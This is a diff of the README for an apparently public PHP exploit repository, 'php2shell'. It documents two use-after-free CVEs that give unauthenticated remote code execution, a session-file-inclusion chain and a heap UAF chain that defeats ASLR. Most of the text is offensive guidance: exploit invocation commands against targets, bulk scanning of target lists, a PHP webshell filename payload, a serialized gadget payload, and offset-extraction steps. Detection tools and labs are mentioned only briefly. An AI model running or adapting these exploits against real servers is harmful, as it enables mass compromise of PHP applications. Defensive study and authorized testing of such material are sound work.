@@ -2,17 +2,18 @@
 
 Pre-auth Remote Code Execution in PHP via `session.upload_progress` abuse.
 
-Two PHP-core vulnerabilities (patched 2026-10-21) that chain
-`session.upload_progress` with memory-limit OOM to achieve unauthenticated
-RCE on any PHP application — WordPress, Laravel, Drupal, custom code — if the
-PHP version is in range and `session.upload_progress.enabled=On` (the default).
+Two PHP-core use-after-free vulnerabilities (patched 2026-10-21) that enable
+unauthenticated RCE on any PHP application — WordPress, Laravel, Drupal,
+custom code — if the PHP version is in range. No application code opts in;
+the bug fires in the PHP interpreter itself, before any app code or WAF runs.
 
-This repository contains:
+This repository contains two **complementary exploitation chains**, detection
+tools, technical documentation, and hands-on practice labs:
 
-- **Detection tools** — version-based and behavioral (zero-dependency Python)
-- **Exploit tool** (`p2s.py`) — unified scanner + multi-strategy RCE
-- **Hands-on labs** — three Docker labs for manual practice (OOM+LFI, Race+LFI, Deserialization)
-- **Offset profiles** — pre-extracted binary offsets for heap exploitation
+| Chain | Tool | Approach | Requires App Bug? | SAPI |
+|-------|------|----------|-------------------|------|
+| **Session File Inclusion** | `p2s.py` | OOM → persist session file → LFI/deser | Yes (LFI or gadget) | PHP-FPM, mod_php |
+| **Heap UAF** | `edb-52704.py` | 2-stage ASLR leak → fake struct → hijack pDestructor | **No** | mod_php prefork |
 
 > **Authorized use only.** These tools are for authorized penetration testing,
 > security research, and CTF/lab practice. Do not use against systems you do not
@@ -24,17 +25,22 @@ This repository contains:
 
 - [Affected Versions](#affected-versions)
 - [The Vulnerability](#the-vulnerability)
+  - [Memory-Level Root Cause](#memory-level-root-cause)
+  - [Session File Inclusion Perspective](#session-file-inclusion-perspective)
+  - [Attack Chain: SFI](#attack-chain-session-file-inclusion)
+  - [Attack Chain: Heap UAF](#attack-chain-heap-uaf-exploitation)
+- [Exploitation Approaches](#exploitation-approaches)
 - [Repository Structure](#repository-structure)
 - [Quick Start](#quick-start)
 - [Detection Tools](#detection-tools)
-- [Exploit Tool (p2s.py)](#exploit-tool-p2spy)
+- [Exploit Tools](#exploit-tools)
 - [Hands-On Labs](#hands-on-labs)
-- [Lab 1: OOM + LFI](#lab-1-oom--session-file-inclusion-port-8801)
-- [Lab 2: Race + LFI](#lab-2-race-condition-lfi-port-8802)
-- [Lab 3: Deserialization RCE](#lab-3-session-deserialization-rce-port-8803)
 - [Key Concepts](#key-concepts)
 - [Offset Extraction](#offset-extraction)
+- [Documentation](#documentation)
 - [Requirements](#requirements)
+- [References](#references)
+- [Credits](#credits)
 
 ---
 
@@ -42,77 +48,156 @@ This repository contains:
 
 | Branch | Vulnerable | Fixed in |
 |--------|------------|----------|
-| 8.5    | ≤ 8.5.11   | 8.5.12   |
-| 8.4    | ≤ 8.4.26   | 8.4.27   |
-| 8.3    | ≤ 8.3.35   | 8.3.36   |
-| 8.2    | ≤ 8.2.34   | 8.2.35   |
-| ≤ 8.1  | All        | EOL — no patch available |
+| 8.5 | 8.5.0 – 8.5.11 | 8.5.12 |
+| 8.4 | 8.4.0 – 8.4.26 | 8.4.27 |
+| 8.3 | 8.3.0 – 8.3.35 | 8.3.36 |
+| 8.2 | 8.2.0 – 8.2.34 | 8.2.35 |
+| 5.4 – 8.1 | All versions | EOL — no patch available |
 
-**Default-vulnerable:** `session.upload_progress.enabled` defaults to `On` in
-every PHP build. No application code needs to opt in — the engine-level handler
+**~99.998% of internet-facing PHP was vulnerable at disclosure.** The
+`session.upload_progress.enabled` setting defaults to `On` in every PHP build
+since 5.4. No application code needs to opt in — the engine-level handler
 fires on any multipart POST with the right field names.
 
 ---
 
 ## The Vulnerability
 
-### Root Cause
+### Memory-Level Root Cause
 
-PHP's `session.upload_progress` feature tracks file upload progress by writing
-metadata (including the uploaded file's **filename**) into the session file at
-`/tmp/sess_<PHPSESSID>`. The attacker controls:
+**CVE-2026-109618** (CVSS 9.2) — Uninitialized pointer use after `longjmp`:
 
-1. The **session ID** (via the `PHPSESSID` cookie)
-2. The **filename** (via `Content-Disposition` in the multipart body)
-3. The **progress name** (via the `PHP_SESSION_UPLOAD_PROGRESS` form field)
+PHP's `_zend_hash_str_add_or_update_i()` (the internal function that inserts
+string keys into arrays) **increments the array's internal counters before the
+key string is fully initialized**. A crafted multipart POST driven through the
+`session.upload_progress` path exhausts `memory_limit`; the OOM fires
+`longjmp()`/`zend_bailout()`, abandoning the C routine mid-initialization. The
+key is left uninitialized but counted as valid. Request cleanup then walks the
+`$_POST` array, misreads the invalid key, and follows an attacker-controlled
+function pointer table → code execution.
+
+**CVE-2026-109619** (CVSS 9.2) — Use-after-free via stale global state:
+
+Request-owned internal state (OOM error info, session handler pointers in
+`PS(id)`, `PS(http_session_vars)`) is stored in process-global variables but
+**not cleared at request shutdown**. After an OOM abort, the next request on
+the same worker process finds stale pointers to freed memory. When
+`fatal_error_backtraces` is enabled (the default), the most recent fatal
+error's backtrace also persists in global state — a diagnostic run on the next
+request operates on attacker-controlled data.
+
+**Chained:** The leaked `php2shell` PoC (Calif.IO) uses 109618 to shape freed
+memory and 109619 to reuse it → instruction-pointer control → reliable unauth
+RCE.
+
+### Session File Inclusion Perspective
+
+PHP's `session.upload_progress` feature tracks upload progress by writing
+metadata — including the uploaded file's **filename** — into the session file
+at `/tmp/sess_<PHPSESSID>`. The attacker controls:
+
+1. The **session ID** (via the `PHPSESSID` cookie) → controls the file path
+2. The **filename** (via `Content-Disposition`) → controls content (PHP code)
+3. The **progress name** (via `PHP_SESSION_UPLOAD_PROGRESS` field) → controls
+   the key
 
 Normally, `session.upload_progress.cleanup=On` (the default) deletes the
-progress data from the session file when the upload completes. But:
+progress data when the upload completes. But an OOM crash before cleanup
+leaves the session file on disk with attacker-controlled PHP code.
 
-- **CVE-2026-109618**: Non-file POST fields allocate ~4× their size in PHP's
-  zend memory manager. Sending many large non-file fields causes an OOM crash
-  (`memory_limit` exceeded) BEFORE the cleanup callback runs. The session file
-  persists on disk with attacker-controlled PHP code in the filename field.
-
-- **CVE-2026-109619**: The OOM condition corrupts internal PHP state (the
-  session handler's stale pointer is not cleaned up), enabling heap-based
-  exploitation via use-after-free.
-
-### Attack Chains
+### Attack Chain: Session File Inclusion
 
 ```
-┌─────────────────────────────────────────────────────────┐
-│              session.upload_progress                      │
-│                                                          │
-│  Attacker POSTs multipart with:                          │
-│   • PHPSESSID=<chosen-id>                               │
-│   • PHP_SESSION_UPLOAD_PROGRESS=<name>                  │
-│   • filename="<?php system('cmd'); ?>"                  │
-│   • 30 × 200KB non-file fields (OOM trigger)            │
-│                                                          │
-│           ┌──── OOM kills worker ────┐                   │
-│           │  cleanup never runs      │                   │
-│           │  /tmp/sess_<id> persists │                   │
-│           └──────────┬───────────────┘                   │
-│                      │                                   │
-│     ┌────────────────┼──────────────────┐                │
-│     ▼                ▼                  ▼                │
-│  Strategy A     Strategy B        Strategy C             │
-│  OOM + LFI      Race + LFI       Heap Exploit           │
-│  (easiest)      (no OOM needed)   (no LFI needed)        │
-│                                                          │
-│  Include the     Slow-drip the    Use-after-free on      │
-│  session file    upload, race     corrupted session       │
-│  via LFI         LFI reads        handler → hijack       │
-│  ?page=/tmp/     during upload    control flow            │
-│  sess_<id>                                               │
-└─────────────────────────────────────────────────────────┘
+┌─────────────────────────────────────────────────────────────┐
+│                session.upload_progress                        │
+│                                                              │
+│  Attacker POSTs multipart with:                              │
+│   • PHPSESSID=<chosen-id>                                   │
+│   • PHP_SESSION_UPLOAD_PROGRESS=<name>                      │
+│   • filename="<?php system('cmd'); ?>"                      │
+│   • 30 × 200KB non-file fields (OOM trigger)                │
+│                                                              │
+│           ┌──── OOM kills worker ────┐                       │
+│           │  cleanup never runs      │                       │
+│           │  /tmp/sess_<id> persists │                       │
+│           └──────────┬───────────────┘                       │
+│                      │                                       │
+│     ┌────────────────┼──────────────────┐                    │
+│     ▼                ▼                  ▼                    │
+│  Strategy A     Strategy B        Strategy C                 │
+│  OOM + LFI      Race + LFI       Handler Deser              │
+│  (easiest)      (no OOM needed)   (no LFI needed)           │
+│                                                              │
+│  Include the     Slow-drip the    php_serialize writes |     │
+│  session file    upload, race     as literal; php handler    │
+│  via LFI         LFI reads        splits on | → unserialize │
+│  ?page=/tmp/     during upload    gadget → __destruct → RCE │
+│  sess_<id>                                                   │
+└─────────────────────────────────────────────────────────────┘
 ```
 
-There is also a **deserialization variant** (Lab 3) that requires no LFI at all:
-if the target uses `session.serialize_handler=php_serialize` and any page reads
-the session with the default `php` handler, the `|` character in the progress
-name splits the session data and feeds a serialized gadget to `unserialize()`.
+### Attack Chain: Heap UAF Exploitation
+
+```
+┌─────────────────────────────────────────────────────────────┐
+│                  Heap UAF Chain (EDB-52704)                   │
+│       No LFI needed — works against ANY PHP page             │
+│                                                              │
+│  Stage 0: Worker Rotation                                    │
+│  ─────────────────────────                                   │
+│  1001 fields + OOM → corrupt heap                            │
+│  Session-init on corrupt heap → segfault                     │
+│  Apache prefork forks fresh worker                           │
+│                                                              │
+│  Stage 1: Heap Leak (ASLR defeat #1)                        │
+│  ────────────────────────────────────                        │
+│  OOM corrupts PS(id) → dangling pointer                      │
+│  Next request: PS(id) → freed memory                         │
+│  Set-Cookie: PHPSESSID=<raw heap bytes>                      │
+│  Extract Zend MM chunk base (2MB-aligned mode)               │
+│                                                              │
+│  Stage 2: Code Leak (ASLR defeat #2)                        │
+│  ────────────────────────────────────                        │
+│  Different OOM shape → HashTable at PS(id)                   │
+│  pDestructor field = ZVAL_PTR_DTOR address                   │
+│  Set-Cookie leaks it → compute libphp base                   │
+│                                                              │
+│  Stage 3: Fake Struct → RCE                                  │
+│  ────────────────────────                                    │
+│  167-byte payload: fake HashTable + execute_data + zend_str  │
+│  pDestructor = zif_system (from Stage 2 base + offset)       │
+│  Overwrite PS(http_session_vars)                             │
+│  Request cleanup → array destruction → pDestructor(cmd)      │
+│  → system("id>/out/p1") → RCE                               │
+└─────────────────────────────────────────────────────────────┘
+```
+
+---
+
+## Exploitation Approaches
+
+The two chains are **complementary, not competing** — each covers scenarios
+the other cannot:
+
+| Aspect | SFI Chain (`p2s.py`) | Heap UAF Chain (`edb-52704.py`) |
+|--------|---------------------|-------------------------------|
+| **Approach** | Poison session file → include/deserialize | Direct heap corruption → hijack pDestructor |
+| **Requires app-level bug** | Yes (LFI or gadget class) | **No — any PHP page** |
+| **ASLR bypass** | Not needed | Yes (2-stage info leak via Set-Cookie) |
+| **SAPI** | PHP-FPM + nginx, mod_php | mod_php + Apache prefork only |
+| **Worker model** | Multi-worker OK | Single-worker required |
+| **Max command length** | Unlimited | 14 bytes (167-byte carrier limit) |
+| **Config requirements** | `memory_limit < post_max_size` | `memory_limit=8M`, `display_errors=1`, `use_strict_mode=0` |
+| **PHP versions tested** | 5.4+ (SFI); 7.4 (deser chain) | 8.4.26 (profiled); theoretically broader |
+| **Reliability** | Deterministic (OOM+LFI) to probabilistic (race) | Probabilistic (heap layout, retries) |
+| **OOM trigger** | 30×200KB non-file fields (zend 4× amplification) | 1001 short fields + 12MB big field + file metadata alloc |
+
+**When to use which:**
+- **SFI chain** — when the target has an LFI or a deserializable gadget class.
+  More reliable, works on PHP-FPM (the common production setup).
+- **Heap UAF chain** — when there's no application-level bug but the target
+  runs mod_php/prefork. Common in Docker/dev environments, less common in
+  production. Only needs any PHP page to exist.
 
 ---
 
@@ -121,7 +206,8 @@ name splits the session data and feeds a serialized gadget to `unserialize()`.
 ```
 php2shell/
 ├── README.md                  # this file
-├── p2s.py                     # unified scanner + exploit (main tool)
+├── p2s.py                     # SFI chain: unified scanner + exploit
+├── edb-52704.py               # Heap UAF chain: OffSec 3-stage exploit
 ├── detect_php2shell.py        # safe version-based detection (1 GET)
 ├── detect_behavioral.py       # behavioral detection (no version headers needed)
 ├── php2shell.py               # godylockz original exploit (mod_php/Apache)
@@ -141,11 +227,16 @@ php2shell/
 │   ├── php.ini
 │   ├── apache.conf
 │   └── www/
-└── labs/                      # session file inclusion practice labs
-    ├── verify.py              # automated verifier for all 3 labs
-    ├── lab-oom-lfi/           # Lab 1: OOM + LFI → RCE (port 8801)
-    ├── lab-race-lfi/          # Lab 2: Race condition + LFI (port 8802)
-    └── lab-deser-rce/         # Lab 3: Deserialization RCE (port 8803)
+├── labs/                      # session file inclusion practice labs
+│   ├── verify.py              # automated verifier for all 3 labs
+│   ├── lab-oom-lfi/           # Lab 1: OOM + LFI → RCE (port 8801)
+│   ├── lab-race-lfi/          # Lab 2: Race condition + LFI (port 8802)
+│   └── lab-deser-rce/         # Lab 3: Deserialization RCE (port 8803)
+└── docs/                      # technical deep-dives
+    ├── heap-exploitation.md   # full EDB-52704 chain walkthrough
+    ├── attack-primitives.md   # catalog of all known primitives
+    ├── detection-guide.md     # detection, WAF rules, IR guidance
+    └── patch-analysis.md      # source-level patch diff analysis
 ```
 
 ---
@@ -165,7 +256,7 @@ python3 detect_php2shell.py --url https://target.example/
 python3 detect_behavioral.py https://target.example/
 ```
 
-### Exploit (authorized targets only)
+### SFI Exploit (authorized targets only)
 
 ```bash
 # Scan + auto-detect
@@ -178,10 +269,26 @@ python3 p2s.py https://target.example/ --deep
 python3 p2s.py https://target.example/ --rce -c 'id;hostname' --allow-remote
 ```
 
+### Heap UAF Exploit (mod_php/prefork targets)
+
+```bash
+# Against a local Docker lab (auto-extracts offsets)
+python3 edb-52704.py -u http://127.0.0.1:8088/index.php
+
+# With a custom command (max 14 bytes)
+python3 edb-52704.py -u http://127.0.0.1:8088/index.php -c 'id>/out/p1' --proof-file out/p1
+
+# Official php:8.4.26-apache image (bookworm profile, default)
+python3 edb-52704.py -u http://127.0.0.1:8088/index.php --profile bookworm
+
+# Lab build (Apache 2.4.68)
+python3 edb-52704.py -u http://127.0.0.1:8088/index.php --profile lab
+```
+
 ### Practice Labs
 
 ```bash
-# Start all 3 labs
+# Start all 3 SFI labs
 cd labs
 for d in lab-oom-lfi lab-race-lfi lab-deser-rce; do
   (cd $d && docker compose up -d --build)
@@ -244,11 +351,13 @@ python3 detect_behavioral.py -f targets.txt -o results.jsonl --proxy http://127.
 
 ---
 
-## Exploit Tool (p2s.py)
+## Exploit Tools
+
+### p2s.py — SFI Chain (Session File Inclusion)
 
 The unified scanner + exploit. Zero dependencies (Python 3.8+ stdlib only).
 
-### Modes
+#### Modes
 
 | Mode | Flag | What it does |
 |------|------|-------------|
@@ -257,45 +366,70 @@ The unified scanner + exploit. Zero dependencies (Python 3.8+ stdlib only).
 | RCE | `--rce` | Multi-strategy RCE attempt |
 | Bulk scan | `-f targets.txt` | Parallel fingerprinting |
 
-### RCE Strategies
-
-`p2s.py --rce` tries three strategies in order:
+#### RCE Strategies
 
 | Strategy | Name | Mechanism | Requirements |
 |----------|------|-----------|-------------|
-| A | Session LFI | OOM prevents cleanup → LFI includes session file | `post_max_size > memory_limit` + LFI on target |
-| B | Race LFI | Slow-drip upload keeps session alive → race LFI | Any body limit + LFI on target |
-| C | Heap exploit | Per-build offset UAF → control flow hijack | Matching offset profile with `zif_system` |
+| A | OOM + LFI | OOM prevents cleanup → LFI includes session file | `post_max_size > memory_limit` + LFI |
+| B | Race + LFI | Slow-drip upload keeps session alive → race LFI | Any body limit + LFI |
+| C | Heap exploit | Per-build offset UAF → control flow hijack | Matching offset profile |
 
 ```bash
-# Auto-detect + assess
-python3 p2s.py https://target.example/
-
-# Deep probe
-python3 p2s.py https://target.example/ --deep
-
-# RCE with custom command (requires --allow-remote for non-localhost)
 python3 p2s.py https://target.example/ --rce -c 'id;hostname' --allow-remote
-
-# Offline version check
-python3 p2s.py --version 8.3.12
-
-# Bulk scan
-python3 p2s.py -f targets.txt -o results.jsonl --workers 10
+python3 p2s.py --version 8.3.12        # offline version check
+python3 p2s.py -f targets.txt -o results.jsonl --workers 10  # bulk scan
 ```
 
-### Safety Guardrails
+#### Safety Guardrails
 
 - Declines patched PHP versions (override: `--force`)
 - Requires `--allow-remote` for non-loopback targets
 - Preflight checks Server header
 
+### edb-52704.py — Heap UAF Chain
+
+OffSec's 3-stage heap exploitation exploit. Achieves RCE through direct memory
+corruption — **no LFI or application-level bug required**.
+
+#### Stages
+
+| Stage | What | Output |
+|-------|------|--------|
+| 0 | Worker rotation | Fresh prefork worker |
+| 1 | Heap leak | Zend MM chunk base address |
+| 2 | libphp leak | libphp.so base address |
+| 3 | Fake struct write | `pDestructor = zif_system` → RCE |
+
+#### Requirements
+
+- **mod_php under Apache prefork** with a single worker
+- `memory_limit=8M`, `display_errors=1`, `session.use_strict_mode=0`
+- The `docker/` directory contains a matching lab setup
+
+```bash
+# Default (bookworm profile = official php:8.4.26-apache)
+python3 edb-52704.py -u http://127.0.0.1:8088/index.php
+
+# Lab profile (Apache 2.4.68)
+python3 edb-52704.py -u http://127.0.0.1:8088/index.php --profile lab
+
+# Custom offsets
+python3 edb-52704.py -u http://target/ --zif-offset 0x43A870 --dtor-offset 0x613C50
+```
+
+**Command length limit:** The 167-byte payload carrier allows a maximum of
+**14 bytes** for the command. For longer commands, chain through a short
+trigger (e.g., write a script first, then `sh</out/c`).
+
+See [docs/heap-exploitation.md](docs/heap-exploitation.md) for the full
+technical walkthrough.
+
 ---
 
 ## Hands-On Labs
 
-Three Docker labs for learning the exploit chain manually. Each lab teaches a
-different attack strategy.
+Three Docker labs for learning the SFI exploit chain manually. Each lab
+teaches a different attack strategy.
 
 | Lab | Port | PHP | Difficulty | Technique |
 |-----|------|-----|------------|-----------|
@@ -345,7 +479,6 @@ filter — it blocks special characters but allows absolute paths and `/tmp/`.
    `/tmp/sess_hackertest01` with your PHP code inside.
 
    ```python
-   # Python example (minimal)
    import socket
 
    sid = "hackertest01"
@@ -565,11 +698,6 @@ a literal character inside a string.
    |O:10:"LogRotator":2:{s:7:"logfile";s:4:"/tmp";s:11:"archive_cmd";s:2:"id";}
    ```
 
-   This gets written to the session file as (php_serialize format):
-   ```
-   a:1:{s:N:"upload_progress_|O:10:"LogRotator":2:{...}";a:5:{...progress...}}
-   ```
-
    Send the poison multipart (same as Lab 1, with OOM fields to prevent cleanup):
 
    ```python
@@ -607,14 +735,6 @@ a literal character inside a string.
    # → uid=33(www-data) gid=33(www-data) groups=33(www-data)
    ```
 
-   What happens internally:
-   1. `trigger.php` sets the handler to `php` and calls `session_start()`
-   2. The `php` handler reads the session file and splits on `|`
-   3. Everything after `|` is passed to `unserialize()`
-   4. `unserialize()` creates a `LogRotator` object with `archive_cmd="id"`
-   5. When the request ends, PHP destroys the object → `__destruct()` fires
-   6. `system("id")` executes → RCE
-
 #### Key Lessons
 
 - **Class name length is critical.** `O:10:` not `O:11:` for `LogRotator`.
@@ -645,12 +765,30 @@ session key is `upload_progress_<NAME>` where the name comes from the
 
 `session.upload_progress.cleanup=On` (default) normally deletes progress data
 when the upload finishes. But if the PHP worker crashes from an out-of-memory
-condition before cleanup, the poisoned session file persists. This OOM is
-trivially achievable:
+condition before cleanup, the poisoned session file persists.
 
-- **Non-file form fields** stay in `$_POST` as PHP zend memory (~4× overhead)
-- **File upload contents** go to disk temp files (don't count toward `memory_limit`)
-- 30 fields × 200KB = 6MB data → ~24MB zend allocation → crashes 8MB `memory_limit`
+Two known OOM trigger techniques:
+
+| Technique | Mechanism | Used by |
+|-----------|-----------|---------|
+| **Non-file field amplification** | 30×200KB fields → ~24MB zend alloc (4× overhead) → OOM at 8MB | p2s.py |
+| **File metadata allocation** | 1001 short fields + 12MB big field; PHP allocates file metadata arrays even with no filename/data | edb-52704.py |
+
+### Session-Based Heap Disclosure (ASLR Defeat)
+
+OOM during session initialization leaves `PS(id)` as a dangling pointer. The
+next request on the same worker reads `PS(id)` to construct `Set-Cookie:
+PHPSESSID=...` — but `PS(id)` now points to freed memory. Raw heap bytes are
+URL-encoded into the cookie and sent to the attacker. Two rounds defeat ASLR:
+one for the Zend MM chunk base, one for the libphp base.
+
+### `fatal_error_backtraces` Global State Poisoning
+
+Default-on since PHP 8.x. The most recent fatal error's backtrace persists in
+process-global memory. An attacker triggers OOM with controlled data in the
+call stack → the backtrace records attacker-controlled pointers → a diagnostic
+run on the next request (same worker) operates on this data. This is the
+CVE-2026-109619 exploitation path.
 
 ### Session Serialization Handler Mismatch
 
@@ -676,9 +814,9 @@ Symfony `Process`.
 
 ## Offset Extraction
 
-For Strategy C (heap exploit), you need binary offsets for the target's exact
-PHP build. The `profiles/` directory contains pre-extracted offsets for common
-builds.
+For Strategy C (heap exploit) and the EDB-52704 chain, you need binary offsets
+for the target's exact PHP build. The `profiles/` directory contains
+pre-extracted offsets for common builds.
 
 ```bash
 # Extract offsets from a mod_php binary
@@ -689,7 +827,23 @@ python3 offsets_fpm.py /path/to/php-fpm > profiles/my-target-fpm.json
 
 # Use with p2s.py
 python3 p2s.py https://target/ --rce --profile profiles/my-target.json
+
+# EDB-52704 auto-extracts from a running Docker container
+python3 edb-52704.py -u http://127.0.0.1:8088/index.php --docker-container php2shell-target
 ```
+
+---
+
+## Documentation
+
+Detailed technical writeups in `docs/`:
+
+| Document | What it covers |
+|----------|---------------|
+| [Heap Exploitation](docs/heap-exploitation.md) | Full EDB-52704 chain walkthrough: stage-by-stage heap manipulation, payload structure, profile calibration |
+| [Attack Primitives](docs/attack-primitives.md) | Catalog of all 7 known attack primitives and their composition into exploit chains |
+| [Detection Guide](docs/detection-guide.md) | Version/behavioral detection, network IoCs, WAF rules, log queries, incident response |
+| [Patch Analysis](docs/patch-analysis.md) | Source-level analysis of the PHP 8.3.35→8.3.36 diff: what changed and why |
 
 ---
 
@@ -698,20 +852,27 @@ python3 p2s.py https://target/ --rce --profile profiles/my-target.json
 - **Python 3.8+** — stdlib only, zero `pip install` dependencies
 - **Docker** — for the practice labs and offset extraction
 - **Target prerequisites:**
-  - `session.upload_progress.enabled=On` (default in all PHP builds)
-  - `session.upload_progress.cleanup=On` (default)
+
+  *SFI chain (p2s.py):*
+  - `session.upload_progress.enabled=On` (default in all PHP builds since 5.4)
   - PHP version in the vulnerable range (see table above)
   - Strategy A: `post_max_size > memory_limit` + an LFI vulnerability
   - Strategy B: any body limit + an LFI vulnerability
   - Strategy C: matching offset profile
   - Deserialization: `php_serialize` handler + `php` handler mismatch + gadget class
 
+  *Heap UAF chain (edb-52704.py):*
+  - mod_php under Apache prefork, single worker
+  - `memory_limit=8M`, `display_errors=1`, `session.use_strict_mode=0`
+  - `session.upload_progress.enabled=On` (default)
+  - Matching offset profile (auto-extracted or manual)
+
 ---
 
 ## Cleanup
 
 ```bash
-# Stop practice labs
+# Stop SFI practice labs
 cd labs
 for d in lab-oom-lfi lab-race-lfi lab-deser-rce; do
   (cd $d && docker compose down)
@@ -723,11 +884,32 @@ cd docker && docker compose down
 
 ---
 
-## License
+## References
 
-For authorized security testing and educational use only.
+- **CVE-2026-109618** — [GHSA-w8hw-w9fx-j79w](https://github.com/advisories/GHSA-w8hw-w9fx-j79w) (CVSS v4.0 9.2)
+- **CVE-2026-109619** — [GHSA-6wmf-4rv5-p3rp](https://github.com/advisories/GHSA-6wmf-4rv5-p3rp) (CVSS v4.0 9.2)
+- **OffSec Blog** — [php2shell: Critical Vulnerabilities in PHP Core](https://www.offsec.com/blog/php2shell-critical-vulnerabilities-in-php-core/)
+- **Exploit-DB 52704** — [OffSec heap UAF exploit](https://www.exploit-db.com/exploits/52704)
+- **Original Research** — [calif.io/php2shell](https://calif.io/php2shell) (Calif, OpenAI, Wiz)
+- **Datadog Security Labs** — php2shell analysis
+- **CrowdStrike** — php2shell threat analysis
+- **Wiz** — php2shell cloud exposure analysis
+- **OffSec Proving Grounds** — CVE-2026-109618 practice machine
+- **php.net** — Emergency security release 2026-10-21 (8.2.35, 8.3.36, 8.4.27, 8.5.12)
+- **VulnCheck** — [php2shell vulnerabilities analysis](https://www.vulncheck.com/blog/php2shell-vulnerabilities)
+- **Zscaler** — [CVE-2026-109618 and CVE-2026-109619 analysis](https://www.zscaler.com/blogs/security-research/cve-2026-109618-and-cve-2026-109619-php-vulnerable-unauthenticated-rce)
+- **Huntress** — Rapid response and detection guidance
+
+---
 
 ## Credits
 
-- CVE-2026-109618 / CVE-2026-109619 original research: [godylockz](https://github.com/godylockz)
-- Session file inclusion labs and unified scanner (`p2s.py`): MomoRizza
+- **Original discovery:** Calif, OpenAI, and Wiz
+- **EDB-52704 heap exploit:** 9bie and eness (adjusted by OffSec)
+- **SFI chain, labs, detection tools:** [MomoRizza](https://github.com/MomoRizza)
+
+---
+
+## License
+
+For authorized security testing and educational use only.
